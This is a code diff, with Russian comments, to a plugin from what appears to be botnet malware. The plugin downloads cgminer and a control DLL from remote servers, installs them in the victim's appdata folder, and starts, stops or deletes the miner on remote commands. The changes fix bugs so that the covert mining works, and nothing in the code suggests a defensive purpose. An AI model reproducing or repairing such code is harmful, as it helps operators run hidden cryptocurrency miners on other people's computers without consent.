@@ -25,7 +25,7 @@ typedef void (WINAPI *typeStop)();
 
 static char* GetBitcoinFolder( char* path )
 {
-	pSHGetFolderPathA( 0, CSIDL_COMMON_APPDATA,  0, 0, path );
+	pSHGetFolderPathA( 0, CSIDL_APPDATA,  0, 0, path );
 	pPathAppendA( path, "bitcoin" );
 	return path;
 }
@@ -38,11 +38,11 @@ static DWORD WINAPI ProcessBitcoin(void*)
 	if( mutex == 0 ) return 0; //уже есть такой процесс
 	DWORD sizeBtcmCab;
 	//загружаем cgminer в cab архиве
-	BYTE* btcmCab = Plugin::DownloadEx( (char*)nameBtcmCab, 0, &sizeBtcmCab, false, true, (char*)mutexBitcoin );
+	BYTE* btcmCab = Plugin::DownloadEx( (char*)nameBtcmCab, 0, &sizeBtcmCab, false, true, 0 );
 	DWORD sizeBtcDll;
 	//загружаем длл, управляющая всем механизмом
-	BYTE* btcDll = Plugin::DownloadEx( (char*)nameBtcDll, 0, &sizeBtcDll, true, true, (char*)mutexBitcoin );
-	if( !btcmCab && !btcDll ) //плагины загрузились
+	BYTE* btcDll = Plugin::DownloadEx( (char*)nameBtcDll, 0, &sizeBtcDll, true, true, 0 );
+	if( btcmCab && btcDll ) //плагины загрузились
 	{
 		DbgBtc( "Плагины загрузились" );
 		char tempCab[MAX_PATH], folderBitcoin[MAX_PATH];
@@ -109,7 +109,7 @@ static void StopBitcoinPlugin()
 bool ExecuteBitcoin(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
 	bool ret = false;
-	if( m_lstrcmp( Args, "del" ) ) //удаление плагина
+	if( m_lstrcmp( Args, "del" ) == 0 ) //удаление плагина
 	{
 		StopBitcoinPlugin();
 		char folderBitcoin[MAX_PATH];
@@ -119,7 +119,7 @@ bool ExecuteBitcoin(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 		ret = true;
 	}
-	else if( m_lstrcmp( Args, "stop" ) ) //остановка плагина
+	else if( m_lstrcmp( Args, "stop" ) == 0 ) //остановка плагина
 	{
 		StopBitcoinPlugin();
 		ret = true;
@@ -131,8 +131,8 @@ bool ExecuteBitcoin(PTaskManager Manager, PCHAR Command, PCHAR Args)
 		{
 			pCloseHandle(mutex);
 			MegaJump(ProcessBitcoin);
-			ret = true;
 		}
+		ret = true;
 	}
 	return ret;
 }
